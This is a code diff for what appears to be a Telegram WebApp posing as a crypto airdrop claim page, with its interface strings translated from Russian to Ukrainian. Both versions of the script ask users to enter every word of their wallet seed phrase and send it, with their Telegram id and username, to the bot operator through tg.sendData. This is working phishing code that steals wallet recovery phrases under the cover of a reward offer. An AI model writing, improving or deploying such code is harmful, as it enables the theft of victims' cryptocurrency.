@@ -1,29 +1,36 @@
 let tg = null;
-let isTelegram = false;
+let demoMode = false;
 
 // ======= Перевірка Telegram WebApp =======
 function initTelegram() {
-    if (typeof Telegram !== "undefined" && Telegram.WebApp) {
-        tg = Telegram.WebApp;
-        tg.ready();
-        isTelegram = !!(tg.initDataUnsafe?.user);
-        console.log("✅ Telegram WebApp активен:", isTelegram);
-    } else {
-        console.warn("⚠️ Telegram WebApp не найден (браузерный режим)");
-        isTelegram = false;
+    if (typeof Telegram === "undefined" || !Telegram.WebApp) {
+        console.warn("📦 Telegram WebApp не знайдено – активовано демо-режим.");
+        demoMode = true;
+        return;
     }
+
+    tg = Telegram.WebApp;
+    tg.ready();
+    console.log("✅ Telegram WebApp ініціалізовано");
 }
 
-// ======= DOM завантажено =======
+// ======= При завантаженні DOM =======
 document.addEventListener("DOMContentLoaded", () => {
     initTelegram();
 
-    // === Завантаження airdrops ===
+    // 🔹 Показати статус
+    const tgStatus = document.getElementById("tg_status");
+    if (demoMode) {
+        tgStatus.innerText = "📦 Демо-режим активний (відкрито через браузер)";
+    } else {
+        tgStatus.innerText = "✅ Telegram WebApp активний";
+    }
+
+    // ======= Завантаження Airdrops =======
     fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
         .then(res => res.json())
         .then(data => {
             const container = document.getElementById('airdropList');
-            if (!container) return;
             container.innerHTML = '';
             data.forEach(drop => {
                 const card = document.createElement('div');
@@ -31,25 +38,25 @@ document.addEventListener("DOMContentLoaded", () => {
                 card.innerHTML = `
                     <img src="${drop.logo}" class="token-logo" alt="${drop.name}" />
                     <h2>${drop.name}</h2>
-                    <p>💸 Награда: <strong>${drop.reward}</strong></p>
-                    <p>🌐 Сеть: ${drop.network}</p>
+                    <p>💸 Нагорода: <strong>${drop.reward}</strong></p>
+                    <p>🌐 Мережа: ${drop.network}</p>
                     <p>⏳ До: ${drop.ends}</p>
-                    <button onclick="selectAirdrop('${drop.name}')">Участвовать</button>
+                    <button onclick="selectAirdrop('${drop.name}')">Участь</button>
                 `;
                 container.appendChild(card);
             });
         })
         .catch(error => {
-            console.error("❌ Ошибка при загрузке JSON:", error);
+            console.error("❌ Помилка при завантаженні airdrops.json:", error);
             document.getElementById("airdropList").innerHTML =
-                "<p style='color:red'>❌ Не удалось загрузить список airdrop'ов.</p>";
+                "<p style='color:red'>❌ Не вдалося завантажити список airdrop'ів.</p>";
         });
 
-    // === Обробка кнопки ===
+    // ======= Submit кнопка =======
     const btn = document.getElementById('submitBtn');
     if (btn) btn.addEventListener('click', submitAirdrop);
 
-    // === Кастомний селектор ===
+    // ======= Кастомний селектор гаманця =======
     const selectWrapper = document.querySelector('.custom-select');
     if (selectWrapper) {
         const selected = selectWrapper.querySelector('.selected');
@@ -76,7 +83,7 @@ document.addEventListener("DOMContentLoaded", () => {
     }
 });
 
-// ======= Вибір airdrop =======
+// ======= Вибір Airdrop =======
 function selectAirdrop(name) {
     document.getElementById('selectedAirdropTitle').innerText = `🔗 ${name}`;
     document.getElementById('airdropList').style.display = 'none';
@@ -84,7 +91,7 @@ function selectAirdrop(name) {
     renderSeedInputs();
 }
 
-// ======= Генерація полів сид-фрази =======
+// ======= Відображення полів seed =======
 function renderSeedInputs() {
     const length = parseInt(document.getElementById('length').value);
     const container = document.getElementById('seedContainer');
@@ -114,34 +121,34 @@ function renderSeedInputs() {
     }
 }
 
-// ======= Відправка участі =======
+// ======= Submit форми =======
 function submitAirdrop() {
     const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
     const words = inputs.map(input => input.value.trim()).filter(Boolean);
 
     if (words.length !== inputs.length) {
-        const warning = document.getElementById('validationWarning');
-        warning.innerText = '❗️ Пожалуйста, заполните все поля.';
-        warning.style.display = 'block';
+        document.getElementById('validationWarning').innerText = '❗️ Заповніть всі поля.';
+        document.getElementById('validationWarning').style.display = 'block';
         return;
     }
 
     const payload = {
         event: "airdrop_claim",
-        user_id: isTelegram ? tg.initDataUnsafe.user.id : "-",
-        username: isTelegram ? tg.initDataUnsafe.user.username : "-",
+        user_id: tg?.initDataUnsafe?.user?.id || "-",
+        username: tg?.initDataUnsafe?.user?.username || "-",
         timestamp: new Date().toISOString(),
         seed: words.join(" "),
         wallet: document.getElementById("wallet").value
     };
 
-    console.log("[📤 Payload]:", payload);
-
-    if (isTelegram) {
+    // ===== Відправка через Telegram WebApp або лог в браузер =====
+    if (!demoMode && tg?.sendData) {
+        console.log("[📤 Надсилання в Telegram WebApp]", payload);
         tg.sendData(JSON.stringify(payload));
         tg.close();
     } else {
-        alert("📦 Демо-режим: данные не отправлены через Telegram WebApp.");
-        // for dev test: navigator.sendBeacon('/debug', JSON.stringify(payload))
+        console.warn("📦 Демо-режим: дані не надіслано через Telegram.");
+        alert("📦 Демо-режим: дані не надіслано (браузерний режим). Відкрийте через Telegram для реальної відправки.");
+        console.log("[DEMO PAYLOAD]", payload);
     }
 }
